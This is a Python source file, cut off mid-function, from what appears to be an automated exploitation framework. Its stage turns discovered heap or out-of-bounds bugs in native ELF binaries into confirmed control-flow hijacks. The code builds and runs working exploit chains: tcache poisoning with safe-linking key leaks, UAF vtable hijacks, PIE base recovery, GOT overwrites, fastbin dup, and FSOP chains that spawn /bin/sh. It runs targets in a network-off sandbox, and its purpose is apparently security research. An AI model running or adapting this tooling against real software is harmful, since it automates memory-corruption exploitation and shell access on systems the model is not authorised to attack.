"""Primitive chaining: turn a discovered heap / out-of-bounds primitive into a DEMONSTRATED
control-flow hijack (L3), or an L2 exploitation recipe when a live win is not reachable.

The `heap_trace` (double-free / UAF / heap-overflow) and `oob_index` (CWE-129) stages discover a
memory-corruption PRIMITIVE but file a Finding that goes nowhere. This stage consumes that lead and
attempts to finish the chain: when the target has a reachable win function (a flag printer / shell
spawner, via `exploit.find_win`), it drives the primitive's menu option to overwrite an adjacent
CODE pointer with the win address, triggers the use, and CONFIRMS control reached the win under the
ptrace debugger -- with the same negative-control causation proof `build_exploit` uses. On success
it files an L3 `verified` poc; otherwise it emits the concrete `aaheg` technique + target recipe as
L2 analyst guidance. Native x86-64 / ELF; the live-confirm path is non-PIE (a PIE win needs a
leak, which stays analyst-gated). Deterministic. """
from __future__ import annotations

import logging
import re
import shutil
import struct
import sys
import tempfile
from pathlib import Path

from ... import observe
from ...jobs.registry import register_stage
from .. import substrate

_log = logging.getLogger(__name__)

# NOTE: cross-subpackage imports (..dynamic, ..fuzz, sibling poc modules) are done LAZILY inside the
# functions below -- importing at module load creates a poc <-> dynamic import cycle (poc.__init__
# imports this module, which would import dynamic.heap_discover, which imports back into poc).

CHAIN_STAGE = "chain_primitive"
TOOL_VERSION = "chain-1"
_NL = b"\n"
# What a win's output looks like -- a flag banner (NAME{...}), a literal /bin/sh, or a shell prompt
# at the start of a line -- so the PIE leak-chain confirms on the win actually RUNNING, not on
# incidental run-to-run noise. The bare case-insensitive `flag` and `$ ` tokens were dropped: they
# match far too much (any line containing "flag"/"flagged", any "$ " amount) and, while the positive
# vs negative-control differencing (pos_lines - neg_lines) usually cancels them, they are the one
# false-positive lever left when win and control output differ incidentally. The brace-banner shape
# already covers a real `flag{...}`; `^[#$] ` (multiline) is an actual shell prompt, not a token.
_WIN_OUT = re.compile(rb"[A-Za-z_][A-Za-z0-9_]{1,15}\{[^}\n]{2,}\}|/bin/sh|^[#$] ", re.I | re.M)
# CWE -> the aaheg vuln class the discovered primitive represents.
_VCLASS = {"CWE-415": "double_free", "CWE-416": "uaf", "CWE-122": "heap_overflow",
           "CWE-129": "oob_write",
           # A pointer WRITE computed from input is a write-what-where by another name, and an
           # indirect call through a field is the hijack this stage searches for -- the same two
           # routes the CWE-129 and CWE-122 leads take.
           "CWE-787": "oob_write", "CWE-822": "heap_overflow"}
#: Which detectors produce a lead worth chaining. Measured across 22 kept conformance stores:
#: `tainted_deref/CWE-787` ("writes through a pointer computed from input") stayed below
#: poc-backed 13 times out of 13, and `heap_fptr_call/CWE-822` ("indirect call through a function
#: pointer in an object field") 5 out of 5 -- every single occurrence. Both NAME the primitive this
#: stage exists to finish, and neither was ever read: the lead set was the two dynamic detectors,
#: so a static detector that found the exact shape of the bug could not hand it over. They are
#: tried last (`confidence` orders the leads, and a static candidate carries less), so a dynamic
#: lead still goes first and the only cost on a target with no real primitive is the searches'
#: own attempt caps.
_LEAD_DETECTORS = ("heap_trace", "oob_index", "tainted_deref", "heap_fptr_call")
#: Rows this stage / the recipe helpers file themselves -- never re-consumed as a lead.
_RECIPE_DETECTORS = ("chain_primitive", "oob_recipe", "recipe")


def _p64(v: int) -> bytes:
    return struct.pack("<Q", v & 0xFFFFFFFFFFFFFFFF)


def _drive_overflow(fields, payload: bytes, *, idx: bytes = b"1", num: bytes = b"999",
                    width=None) -> bytes:
    """One invocation of an option whose LAST string field carries the raw overflow `payload`
    (filler + the code address). A leading size field is driven large so the copy is unbounded."""
    from ..fuzz import menu
    last_str = max((i for i, f in enumerate(fields) if f == "str"), default=len(fields) - 1)
    out = bytearray()
    for i, f in enumerate(fields):
        if i == last_str:
            out += menu._data(payload, width)
        elif f == "idx":
            out += menu._scalar(idx, width)
        elif f == "num":
            out += menu._scalar(num, width)
        else:
            out += menu._data(b"AAAA", width)
    if not fields:                                       # option with no learned fields
        out += menu._data(payload, width)
    return bytes(out)


def _lead_finding(conn, target):
    """The discovered primitive to chain: the highest-confidence lead from any detector that names
    one (see `_LEAD_DETECTORS`). A DYNAMIC lead outranks a static one at equal confidence, because
    a traced use-after-free is a fact about this run and a pattern match is a fact about the code."""
    from ...db.dao import FindingDAO
    # Any detector's CWE-129 also counts: an array-index finding NAMES the indexed-write primitive
    # whoever found it (a static array-index detector included). Recipe rows are never leads.
    leads = [f for f in FindingDAO(conn).list_by_target(target.id)
             if f.cwe in _VCLASS and f.detector not in _RECIPE_DETECTORS
             and (f.detector in _LEAD_DETECTORS or f.cwe == "CWE-129")]
    return max(leads, key=lambda f: (f.confidence, f.detector in ("heap_trace", "oob_index")),
               default=None)


_DISCLOSE_CWE = ("CWE-125", "CWE-457")


def _disclose_lead(conn, target):
    """An out-of-bounds / uninitialised READ finding to weaponize into an information disclosure
    (highest confidence first). Recipe rows are never leads."""
    from ...db.dao import FindingDAO
    leads = [f for f in FindingDAO(conn).list_by_target(target.id)
             if f.cwe in _DISCLOSE_CWE and f.detector not in _RECIPE_DETECTORS]
    return max(leads, key=lambda f: f.confidence, default=None)


def _recipe(vclass: str, win, target_bytes: bytes, glibc=None) -> dict:
    """An aaheg technique + concrete write target when a live hijack is not demonstrable. `glibc`
    (major, minor) gates the technique selection correctly (hooks removed in 2.34, safe-linking in
    2.32, double-free key in 2.29, House of Force only <2.29); without it the planner assumed a
    fixed modern version and mis-offered/omitted techniques for an old-libc target."""
    from . import aaheg
    env = aaheg.Env(glibc=glibc) if glibc else aaheg.Env()
    goal = (aaheg.Goal(kind="control_flow", value=(win[1] if win else 0),
                       trigger="overwrite a called code pointer with the win address")
            if win else aaheg.Goal(kind="arbitrary_write"))
    if vclass == "oob_write":
        # not a heap technique: the index escapes the array bounds -> write through the OOB slot
        return {"technique": "oob-index-write", "goal": goal.kind,
                "note": ("write a chosen value through the out-of-bounds array slot; aim it at a "
                         "saved return / GOT entry / function pointer, then trigger its use")}
    plan = aaheg.plan_exploit(aaheg.Vuln(vclass=vclass), goal, env=env)
    plan["technique"] = plan.get("technique") or (plan.get("advisory_alternatives") or [{}])[0].get(
        "technique", "tcache-poison")
    return plan


def chain_primitive_stage(ctx) -> dict:
    from ...db.dao import CallEdgeDAO, StringDAO, TargetDAO
    from ..dynamic import sandbox
    from ..dynamic.heap_discover import shared_op_model
    from ..fuzz import menu
    from . import exploit
    from .capture import make_capture, materialize_helper
    target = TargetDAO(ctx.conn).get(ctx.target_id) if ctx.target_id else None
    if target is None:
        raise ValueError("chain_primitive requires a target_id")
    host = sandbox.host_arch()
    _what = "primitive chaining"
    why = (substrate.foreign_cpu_reason(target.arch, target.file_type, host, _what)
           or substrate.native_only_reason(target.file_type, _what))
    if why:
        # Cannot RUN the target here -- but an indexed write's weaponization is arithmetic over the
        # image (array base/stride, GOT slots, win), not a search. File it rather than nothing.
        filed = _static_index_recipe(ctx, target, _lead_finding(ctx.conn, target), why)
        ctx.emit("chain.done", payload={"applicable": False, "note": why,
                                        "static_recipes": len(filed)})
        return {}

    lead = _lead_finding(ctx.conn, target)
    if lead is None:
        # No control-flow primitive to chain -- but an out-of-bounds READ is still weaponizable:
        # steer it onto a GOT slot and DISCLOSE the libc base (a confirmed CWE-125 info leak, and
        # the ASLR-defeat leak the control-flow chains consume). Only when such a lead exists.
        dlead = _disclose_lead(ctx.conn, target)
        if dlead is not None and not substrate.native_only_reason(target.file_type, "disclosure"):
            # Two shapes: a reclaimed-heap read (free a chunk, read its stale allocator metadata)
            # and an out-of-bounds array read steered onto a GOT slot. Each self-skips if it does
            # not fit; both recover a libc/PIE base (ASLR defeat) as a poc-backed L3.
            got = (_heap_uninit_disclose(ctx, target, dlead)
                   or _oob_read_disclose_stage(ctx, target, dlead)
                   or _stack_secret_disclose_stage(ctx, target, dlead))
            if got:
                return got
        ctx.emit("chain.done", payload={"applicable": False,
                 "note": "no heap / out-of-bounds primitive discovered to chain"})
        ctx.progress(pct=100, msg="no primitive lead to chain")
        return {}
    vclass = _VCLASS[lead.cwe]

    target_bytes = ctx.content.path(target.sha256).read_bytes()
    from . import rop
    from .exploit_stage import _libc_bytes_for
    _glibc = rop.libc_version(_libc_bytes_for(ctx, target) or b"")   # gate heap techniques by version
    functions = exploit.elf_functions(target_bytes)
    edges = CallEdgeDAO(ctx.conn).list_by_target(target.id)
    win = exploit.find_win(functions, call_edges=edges)
    win = win if win[0] else None
    pie = (target.mitigations or {}).get("pie") == "on"

    # doc 58: the common STACK-array unchecked-index write -> saved-return-address overwrite with a
    # RAW-binary or scanf read input -- the shape the menu/global-array hijack below does not model.
    # Construct it directly and confirm by detonation; if it lands a poc-backed L3, that function is
    # done (the recipe fallback self-skips via its `poc:` dedup key). On a PIE target the constructor
    # consumes the pointer the program discloses to recover the base (ASLR-honest) and writes
    # base+win_off -- so it is NOT gated on non-PIE any more; it self-skips when there is no leak.
    try:
        from . import oob_construct
        if oob_construct.construct_stack_oob_writes(ctx, target):
            ctx.emit("chain.done", payload={"applicable": True,
                     "note": "constructed + detonated an oob-index-write -> control-hijack L3"})
            ctx.progress(pct=100, msg="oob-index-write -> control hijack: L3 constructed")
            return {}
    except Exception:                                      # noqa: BLE001 -- best-effort; fall through
        observe.absorbed(_log, "stack-oob construct skipped")

    # Without a reachable win, a HIJACK has nothing to point at -- but an arbitrary WRITE does not
    # need one. A write-what-where plus the arbitrary read that comes with it leaks the libc base
    # out of a GOT slot and forges a FILE, so exit() calls system("/bin/sh"): no win function, no
    # system() in the PLT, ASLR left on. That whole class used to stop here at an L2 recipe saying
    # a leak-based chain was analyst work.
    # A PIE image is still a hard stop for THIS route (the GOT slot and the array it writes
    # through are only addressable once the image base is known); the win-based ladder below
    # recovers a PIE base from an in-band leak instead.
    if win is None:
        if vclass == "oob_write" and not pie:
            staged = _stage_and_crawl(ctx, target, exe_dir=None)
            if staged:
                wd, exe_p, opts_p, model_p, width_p = staged
                try:
                    got = _www_shell(ctx, target, target_bytes, lead, vclass,
                                     exe=exe_p, opts=opts_p, model=model_p, width=width_p)
                finally:
                    shutil.rmtree(wd, ignore_errors=True)
                if got:
                    return got
        # No win function, but a heap bug can still reach a SHELL without one: House of Cat forges a
        # FILE and makes exit() run system(" /bin/sh"). Needs the linked libc + a disclosing view;
        # self-skips otherwise. The no-win branch that used to stop at an L2 recipe.
        if vclass in ("uaf", "double_free", "heap_overflow") and not pie:
            from .exploit_stage import _libc_bytes_for
            staged = _stage_and_crawl(ctx, target, exe_dir=None)
            if staged:
                wd, exe_p, opts_p, model_p, width_p = staged
                try:
                    got = _house_of_cat_shell(ctx, target, target_bytes, lead, vclass, exe=exe_p,
                                              opts=opts_p, model=model_p, width=width_p, workdir=wd,
                                              libc_data=_libc_bytes_for(ctx, target) or b"")
                finally:
                    shutil.rmtree(wd, ignore_errors=True)
                if got:
                    return got
        recipe = _recipe(vclass, win, target_bytes, glibc=_glibc)
        why = "no reachable win function (a leak-based libc/one-gadget chain is analyst-gated)"
        _file_recipe(ctx, target, lead, vclass, win, recipe, why)
        ctx.emit("chain.done", payload={"applicable": True, "confirmed": False, "vclass": vclass,
                 "win": None, "recipe": recipe.get("technique"), "note": why})
        ctx.progress(pct=100, msg=f"L2 recipe for {vclass} (live hijack not demonstrable: {why})")
        return {"metrics": {"chained": False, "vclass": vclass}}

    win_name, win_addr = win
    workdir = Path(tempfile.mkdtemp(prefix="lykos-chain-"))
    sandbox.protect_dir(getattr(ctx.content, "root", None))
    try:
        exe = workdir / "target.bin"
        ctx.content.stage_target(target, exe.parent, exe.name)
        exe.chmod(0o755)
        strings = [x.value for x in StringDAO(ctx.conn).list_by_target(target.id)
                   if getattr(x, "value", None)]
        opts = menu.detect_menu(strings)
        width, model = shared_op_model(ctx, target, workdir, exe, opts)   # fixed-width + crawl, shared

        if pie:
            # PIE: the win address is only known at runtime. Recover the base from an in-band leak
            # and relocate the overwrite in the SAME process (an honest ASLR defeat), confirmed by
            # the win's output under a negative control.
            hit = _pie_leak_chain(ctx, target_bytes, exe, win, opts, model, width, workdir)
            if hit:
                leak_opt, writer, off, trig, base = hit
                return _file_pie_l3(ctx, target, lead, vclass, win_name, win_vaddr=win_addr,
                                    leak_opt=leak_opt, writer=writer, off=off, trig=trig)
            recipe = _recipe(vclass, win, target_bytes, glibc=_glibc)
            _file_recipe(ctx, target, lead, vclass, win, recipe,
                         "PIE: no in-band leak recovered the image base (leak-chain not confirmed)")
            ctx.emit("chain.done", payload={"applicable": True, "confirmed": False,
                     "vclass": vclass, "win": win_name, "note": "PIE leak-chain not confirmed"})
            ctx.progress(pct=100, msg=f"PIE {vclass}: no in-band leak to relocate {win_name}")
            return {"metrics": {"chained": False, "vclass": vclass, "pie": True}}

        helper = materialize_helper()
        capture = make_capture(ctx, helper, str(exe), "stdin", [], 8, sys.executable)
        try:
            if vclass in ("double_free", "uaf"):
                # C++ UAF -> vtable hijack: overwrite the freed object's vtable pointer with an
                # inline fake table so the dangling virtual call dispatches to win. Tried first for a
                # C++ target, whose empty menu crawl gives tcache-poison's role lookup nothing.
                vt = _cpp_vtable_uaf(ctx, target, target_bytes, exe, functions, edges, win, opts,
                                     model, width, workdir, capture)
                if vt:
                    seq, new_o, free_o, edit_o, show_o, chunk, size = vt
                    return _file_l3(ctx, target, lead, vclass, win_name, win_addr, seq,
                                    blame=(f"UAF vtable hijack: option {edit_o} overwrites the freed "
                                           f"object's vtable pointer (inline fake table at "
                                           f"{hex(chunk + 8)}), option {show_o}'s virtual call "
                                           f"dispatches to &{win_name}"),
                                    writer=edit_o, off=None, trig=show_o, exe=exe)
                # Leak-consuming safe-linked tcache poison FIRST: recover the heap key from an
                # in-band UAF leak and forge the fd at runtime, so the PoC survives heap ASLR on the
                # live target (the traced-address _tcache_chain below is only valid ASLR-off). Tried
                # first because it is the one that generalises off the sandbox.
                hl = _heap_leak_chain(ctx, exe, win, opts, model, width, workdir, glibc=_glibc)
                if hl:
                    roles, trig, tgt, key = hl
                    return _file_heap_leak_l3(ctx, target, lead, vclass, win_name, win_addr,
                                              roles, trig, tgt, key,
                                              _glibc is None or tuple(_glibc) >= (2, 32))
                # tcache-poison: free -> UAF-overwrite fd -> alloc a chunk over a code ptr
                tc = _tcache_chain(ctx, target, target_bytes, exe, functions, edges, win, opts,
                                   model, width, workdir, capture, glibc=_glibc)
                if tc:
                    seq, tgt, trig = tc
                    return _file_l3(ctx, target, lead, vclass, win_name, win_addr, seq,
                                    blame=f"tcache-poison chunk over {hex(tgt)}", writer=trig,
                                    off=None, trig=trig, exe=exe)
                # Fastbin dup: the double-free route that needs no UAF write (the dup hands the
                # same chunk out twice), for an OLD-glibc target where fastbins still exist and a
                # fake-chunk target is available -- the common air-gapped box. Gated inside on
                # fastbins_present, so it self-skips on a modern (fastbin-free) libc.
                from .exploit_stage import _libc_bytes_for
                fbd = _fastbin_dup_chain(ctx, exe, target_bytes, win, opts, model, width, workdir,
                                         glibc=_glibc, libc_data=_libc_bytes_for(ctx, target) or b"")
                if fbd:
                    roles, trig, tgt, size, key = fbd
                    return _file_fastbin_dup_l3(ctx, target, lead, vclass, win_name, win_addr,
                                                roles, trig, tgt, size, max(size - 8, 1), key,
                                                _glibc is None or tuple(_glibc) >= (2, 32))
            else:
                # CWE-129/787 indexed write -> write-what-where on a GOT slot / fn-pointer. The
                # index selects the address, so the target can be the whole GOT, not just a byte
                # offset inside the array (what _search_hijack walks below).
                if vclass == "oob_write":
                    ow = _oob_write_hijack(ctx, capture, target_bytes, exe, opts, model, win_addr,
                                           width=width)
                    if ow:
                        seq, writer, idx, tgt_addr, trig, tgt_name = ow
                        return _file_l3(ctx, target, lead, vclass, win_name, win_addr, seq,
                                        blame=(f"option {writer} writes index {idx} "
                                               f"({tgt_name} at {hex(tgt_addr)}) := &{win_name}"),
                                        writer=writer, off=None, trig=trig, exe=exe)
                # heap overflow / oob write -> overwrite an adjacent code pointer directly.
                # Every PRIMER in turn, not one: `menu.alloc_primers` supplies the default pair of
                # objects and, for a count-taking creator, the wrap thresholds that make the
                # allocation UNDERSIZED -- which is the only state in which an integer overflow
                # has an overflow to find at all.
                alloc = next((o for o in opts if o in model and menu._is_alloc(model[o])), None)
                writers = [o for o in opts if o in model and "str" in model[o]] or opts
                for i, prime in enumerate(menu.alloc_primers(model, alloc, width) or [b""]):
                    found = _search_hijack(ctx, capture, prime, model, writers,
                                           list(opts) + [None], win_addr, width=width)
                    if not found:
                        continue
                    seq, writer, off, trig = found
                    # Say WHY the overflow was possible when the answer is the primer: a wrap
                    # primer means the allocation was undersized by its own size arithmetic, and
                    # a report that omits that names the consequence without the defect.
                    undersized = ("; the allocation was undersized first -- option "
                                  f"{alloc}'s count wrapped the size computation (CWE-190), which "
                                  "is what gives the copy anything to run past" if i else "")
                    return _file_l3(ctx, target, lead, vclass, win_name, win_addr, seq,
                                    blame=(f"option {writer} overwrites a code pointer at +{off}"
                                           + undersized),
                                    writer=writer, off=off, trig=trig, exe=exe)
                # The brute offset walk above tops out at a 64-byte reach; a large overflow buffer
                # puts the victim's code pointer request2size(size) bytes on, past that window.
                # Fall back to the allocator-model-COMPUTED distance, which has no such cap.
                comp = _computed_adjacent_hijack(ctx, capture, opts, model, width, win_addr)
                if comp:
                    seq, buf_opt, obj_opt, writer, dist, trig = comp
                    return _file_l3(ctx, target, lead, vclass, win_name, win_addr, seq,
                                    blame=(f"option {writer} overflows a {buf_opt}-allocated buffer "
                                           f"into the adjacent {obj_opt}-allocated object's code "
                                           f"pointer at computed +{dist} (request2size-exact)"),
                                    writer=writer, off=dist, trig=trig, exe=exe)
        finally:
            shutil.rmtree(helper.parent, ignore_errors=True)

        # A win exists but nothing reached it. For an arbitrary write that is not the end of the
        # road: the FSOP route needs no win at all.
        if vclass == "oob_write":
            got = _www_shell(ctx, target, target_bytes, lead, vclass,
                             exe=exe, opts=opts, model=model, width=width)
            if got:
                return got
        recipe = _recipe(vclass, win, target_bytes, glibc=_glibc)
        _file_recipe(ctx, target, lead, vclass, win, recipe,
                     f"drove {vclass} but control never reached {win_name}",
                     seq_for=_index_seq_builder(opts, model, width))
        ctx.emit("chain.done", payload={"applicable": True, "confirmed": False,
                 "vclass": vclass, "win": win_name})
        ctx.progress(pct=100, msg=f"{vclass} chain to {win_name} not confirmed (L2 recipe)")
        return {"metrics": {"chained": False, "vclass": vclass}}
    finally:
        shutil.rmtree(workdir, ignore_errors=True)


def _pie_spawn(workdir, exe):
    """A fresh sandboxed interactive process for the PIE leak-then-chain driver."""
    import subprocess

    from ..dynamic import sandbox

    # isolate_prefix's first argument is the exe DIRECTORY it ro-binds so bwrap can exec the
    # target. Pass the exe's own directory, not workdir: production happens to place the exe inside
    # workdir, but a caller with the two apart (e.g. a prebuilt fixture) would otherwise leave the
    # binary unbound and bwrap fails with `execvp ...: No such file or directory`. workdir stays a
    # rw bind for the target's own writes / cwd.
    exedir = str(Path(exe).resolve().parent)
    def spawn():
        cmd = sandbox.isolate_prefix(exedir, net=False, rw_binds=[str(workdir)]) + [str(exe)]
        return subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                stderr=subprocess.STDOUT, cwd=str(workdir),
                                preexec_fn=sandbox._rlimits(2048, 20, set_as=False))
    return spawn


def _pie_drain(proc, idle=0.25, total=3.0):
    """Read a process's output until it stalls waiting for input, exits, or `total` elapses."""
    import os
    import select
    import time
    buf, end = b"", time.time() + total
    while time.time() < end:
        r, _, _ = select.select([proc.stdout], [], [], idle)
        if r:
            try:
                chunk = os.read(proc.stdout.fileno(), 4096)
            except OSError:
                break
            if not chunk:
                break
            buf += chunk
        elif proc.poll() is not None:
            break
        else:
            return buf, True                             # stalled: awaiting input
    return buf, (proc.poll() is None)


def _pie_run(spawn, width, leak_opt, writer, off, trig, win_vaddr, target_bytes, *, corrupt):
    """One in-process leak-then-chain run (an honest ASLR defeat -- the leak and the overwrite
    happen in the SAME process): drive the leak option, recover the base from what it discloses,
    overwrite an adjacent code pointer with base+win_vaddr (or a corrupted value for the negative
    control), trigger, and return (base, trigger_output). base is None when the leak did not
    recover a base."""
    from ..fuzz import menu
    from . import exploit
    proc = spawn()
    try:
        _pie_drain(proc)                                 # first menu
        proc.stdin.write(menu._scalar(leak_opt.encode(), width)); proc.stdin.flush()
        out, _ = _pie_drain(proc)
        vals = [int(x, 16) for x in re.findall(rb"0x[0-9a-fA-F]+", out)]
        base = exploit.recover_pie_base(vals, target_bytes) if vals else None
        if not base:
            return None, b""
        addr = (base + win_vaddr) if not corrupt else (base + win_vaddr) ^ 0xFFFF
        proc.stdin.write(menu._scalar(writer.encode(), width)); proc.stdin.flush()
        _pie_drain(proc)
        proc.stdin.write(b"A" * off + _p64(addr)); proc.stdin.flush()   # overflow the code pointer
        _pie_drain(proc)
        if trig is not None:
            proc.stdin.write(menu._scalar(trig.encode(), width)); proc.stdin.flush()
        tout, _ = _pie_drain(proc)
        return base, tout
    except (BrokenPipeError, OSError):
        return None, b""
    finally:
        # Close the pipes BEFORE killing: a half-filled stdin buffer finalised after the process
        # is gone raises an unraisable BrokenPipeError no `except` here can catch.
        from ..dynamic import sandbox as _sb
        _sb.kill_quietly(proc)


def _pie_leak_chain(ctx, target_bytes, exe, win, opts, model, width, workdir):
    """PIE control-flow hijack via an in-band leak: find the option that discloses a recoverable
    image base, then overwrite an adjacent code pointer with base+win_vaddr and confirm the win
    RUNS (its output appears) -- gated by a negative control (a corrupted address must NOT win).
    Returns (leak_opt, writer, off, trig, base) or None. Marker-confirmed (no ptrace), because the
    leak+overwrite must share one live process to defeat real ASLR."""
    win_name, win_vaddr = win
    spawn = _pie_spawn(workdir, exe)
    leak_opt = next((o for o in opts
                     if _pie_run(spawn, width, o, o, 8, None, win_vaddr, target_bytes,
                                 corrupt=False)[0]), None)
    if leak_opt is None:
        return None
    writers = [o for o in opts if o in model and "str" in model[o]] or list(opts)
    triggers = list(opts) + [None]
    attempts = 0
    for writer in writers:
        for off in range(8, 72, 8):
            for trig in triggers:
                if ctx.should_cancel() or attempts >= 220:
                    return None
                attempts += 1
                base, pos = _pie_run(spawn, width, leak_opt, writer, off, trig, win_vaddr,
                                     target_bytes, corrupt=False)
                if not base:
                    continue
                pos_lines = {ln for ln in pos.splitlines() if ln.strip()}
                # A win-only line that also LOOKS like a win (a flag banner / shell), so leaked-
                # pointer noise that merely differs run-to-run is not mistaken for success.
                if not any(_WIN_OUT.search(ln) for ln in pos_lines):
                    continue
                _, neg = _pie_run(spawn, width, leak_opt, writer, off, trig, win_vaddr,
                                  target_bytes, corrupt=True)
                neg_lines = {ln for ln in neg.splitlines() if ln.strip()}
                won = [ln for ln in pos_lines - neg_lines if _WIN_OUT.search(ln)]
                if won:
                    ctx.progress(msg=f"PIE hijack: leak {leak_opt} -> base -> option {writer} "
                                     f"writes base+{win_vaddr:#x} at +{off} -> {win_name} ran")
                    return leak_opt, writer, off, trig, base
    return None


def _heap_leak_run(spawn, width, roles, trig, target, win_addr, model, *, safe, corrupt):
    """One in-process safe-linking tcache-poison run -- ASLR-robust, because the leak and every
    write happen in the SAME live process so the key is the running one (not a traced constant, the
    limit of `_tcache_chain`).

    Free a fresh chunk, READ the heap key its use-after-free view discloses (a lone freed tcache
    chunk's fd == addr>>12 under safe-linking), forge fd := key ^ target so the next-but-one malloc
    lands a chunk ON `target`, write `win_addr` there and trigger the call through it. `corrupt`
    forges a deliberately-wrong fd for the negative control. Returns (key, trigger_output); key is
    None when the view disclosed nothing recoverable. Never raises."""
    from ..fuzz import menu
    from . import heap_groom
    add, free, view, edit = roles["add"], roles["free"], roles["view"], roles["edit"]
    proc = spawn()
    try:
        _pie_drain(proc)

        def send(b):
            proc.stdin.write(b)
            proc.stdin.flush()

        def op(opt, **kw):
            send(menu._scalar(opt.encode(), width) + menu._fill(model.get(opt, []), width=width, **kw))
            return _pie_drain(proc)[0]

        def idx_op(opt, idx):
            send(menu._scalar(opt.encode(), width) + menu._scalar(str(idx).encode(), width))
            return _pie_drain(proc)[0]

        def edit_at(idx, payload):
            # idx, [length,] then the raw fd/word with NO terminator -- an exact-length read()
            # would otherwise leave a stray newline in the pipe and desync the next op.
            out = menu._scalar(edit.encode(), width) + menu._scalar(str(idx).encode(), width)
            if "num" in model.get(edit, []):
                out += menu._scalar(str(len(payload)).encode(), width)
            send(out + menu._data(payload, width, term=False))

        # Free TWO same-size chunks so the bin count stays > 0 across both reclaiming mallocs
        # (glibc gates tcache_get on counts[idx] > 0, so a single free lets only ONE malloc be
        # redirected -- never reaching the forged target). Bin becomes [B, A] (LIFO): A (freed
        # first) is the tail with a CLEAN fd == addr>>12, B (freed second) is the head we poison.
        op(add, num=b"24")                               # chunk 0 -- A (leak source, the tail)
        op(add, num=b"24")                               # chunk 1 -- B (the head we poison)
        idx_op(free, 0)                                  # free A -> A.fd == mangle(A, NULL) == A>>12
        idx_op(free, 1)                                  # free B -> bin [B, A], count 2
        leak = idx_op(view, 0)                            # UAF view of the TAIL A -> the clean key
        key = heap_groom.parse_heap_key(leak if isinstance(leak, bytes) else leak.encode("latin1"))
        if key is None:
            return None, b""
        # B sits one chunk from A, so B>>12 == A>>12 == key except across a page boundary -- and a
        # wrong key just fails the oracle, never a false confirm.
        mangled = heap_groom.forge_safelink_fd(key, target) if safe else target
        if corrupt:
            mangled ^= 0xDEAD0000                        # a wrong fd -> malloc misses target
        edit_at(1, _p64(mangled))                        # UAF write the poisoned fd into the HEAD B
        _pie_drain(proc)
        op(add, num=b"24")                               # chunk 2 -- reclaims B (count -> 1)
        op(add, num=b"24")                               # chunk 3 -- lands ON target (count -> 0)
        _pie_drain(proc)
        edit_at(3, _p64(win_addr))                        # write win over the code pointer at target
        _pie_drain(proc)
        tout = b""
        if trig is not None:
            send(menu._scalar(trig.encode(), width) + menu._scalar(b"3", width))
            tout = _pie_drain(proc)[0]
        return key, (tout if isinstance(tout, bytes) else tout.encode("latin1"))
    except (BrokenPipeError, OSError):
        return None, b""
    finally:
        from ..dynamic import sandbox as _sb
        _sb.kill_quietly(proc)


def _heap_leak_chain(ctx, exe, win, opts, model, width, workdir, *, glibc=None):
    """Leak-consuming safe-linked tcache poison -> control hijack: find the add/free/view/edit roles,
    then for each writable fn-pointer target recover the heap key from an in-band UAF leak and forge
    a chunk over the target IN ONE PROCESS, confirming the win RUNS (its banner / shell appears) with
    a negative control (a corrupted fd must NOT win). Marker-confirmed, not ptrace: the leak and the
    poison must share one process to defeat real heap ASLR, so no static payload can carry it. The
    ASLR-robust complement to `_tcache_chain` (which bakes in a traced, ASLR-off address). Returns
    (roles, trig, target, key) or None.

    Requires a use-after-free VIEW that discloses the freed chunk's fd (the safe-linking leak) and a
    use-after-free EDIT that overwrites it -- the standard poison shape. Best-effort; bounded."""
    from ..dynamic import heap_discover
    win_name, win_addr = win
    safe = glibc is None or (isinstance(glibc, tuple) and tuple(glibc) >= (2, 32))
    roles = heap_discover.identify_heap_ops(workdir, exe, model, opts, width)
    if not roles or not roles.get("edit"):               # need the UAF write that plants the fd
        return None
    targets = _writable_globals(exe)
    if not targets:
        return None
    spawn = _pie_spawn(workdir, exe)
    attempts = 0
    for tgt in targets:
        for trig in list(opts) + [None]:
            if ctx.should_cancel() or attempts >= 200:
                return None
            attempts += 1
            key, pos = _heap_leak_run(spawn, width, roles, trig, tgt, win_addr, model,
                                      safe=safe, corrupt=False)
            if key is None:
                continue
            pos_lines = {ln for ln in pos.splitlines() if ln.strip()}
            if not any(_WIN_OUT.search(ln) for ln in pos_lines):
                continue
            _, neg = _heap_leak_run(spawn, width, roles, trig, tgt, win_addr, model,
                                    safe=safe, corrupt=True)
            neg_lines = {ln for ln in neg.splitlines() if ln.strip()}
            if [ln for ln in pos_lines - neg_lines if _WIN_OUT.search(ln)]:
                ctx.progress(msg=(f"safe-linked tcache poison: leak {roles['view']} -> heap key, "
                                  f"fd := key^{tgt:#x}, chunk over {tgt:#x} := &{win_name} -> ran"))
                return roles, trig, tgt, key
    return None


# --------------------------------------------------------------------- fastbin dup (double-free)
_TCACHE_COUNT = 7                                        # glibc default per-bin tcache capacity


#: Fastbin size classes to try when the fake chunk's size field is only known at run time (the
#: static image shows nothing), smallest first -- the common ones cover almost every real target.
_FASTBIN_REQ_CLASSES = (0x18, 0x28, 0x38, 0x48, 0x58, 0x68, 0x78)


def _fastbin_fake_targets(exe, target_bytes, *, max_runtime: int = 6):
    """16-aligned writable fn-pointer slots a fastbin dup can land a chunk on, each as
    (target, chunk_size | None). Unlike tcache, the fastbin malloc path checks
    `fastbin_index(chunksize(victim)) == idx`, so the target's chunk header (the 8 bytes at
    target-0x8) has to look like a fastbin-size chunk or malloc aborts "memory corruption (fast)".

    Two tiers:
      * STATIC -- the size word is in the ELF image (a .data initializer): the size is KNOWN, so
        the dup uses exactly it. These come first (smallest size first).
      * RUNTIME -- the slot is in .bss, or its preceding word is set at run time, so the image shows
        nothing: emitted with size=None (bounded to `max_runtime`), and the dup TRIES the common
        fastbin classes, with the execution oracle confirming the one whose runtime size matches.
    This closes the case where the fake size exists only at run time; it stays sound because a wrong
    class simply aborts without winning. The fake-chunk precondition is why fastbin dup is narrower
    than the tcache poison."""
    from . import elfstatic
    from .heap import is_fastbin
    static, runtime = [], []
    for t in _writable_globals(exe):                     # already 16-aligned, code-referenced
        off = elfstatic.vaddr_to_offset(target_bytes, t - 8)
        size = None
        if off is not None and off + 8 <= len(target_bytes):
            v = int.from_bytes(target_bytes[off:off + 8], "little") & ~0x0F
            if is_fastbin(v):
                size = v
        (static if size else runtime).append((t, size))
    static.sort(key=lambda ts: ts[1])
    return static + runtime[:max_runtime]


def _fastbin_dup_run(spawn, width, roles, trig, target, req, win_addr, model, *, safe, corrupt):
    """One in-process fastbin-dup run against a DOUBLE-FREE, ASLR-robust (leak + dup + write in one
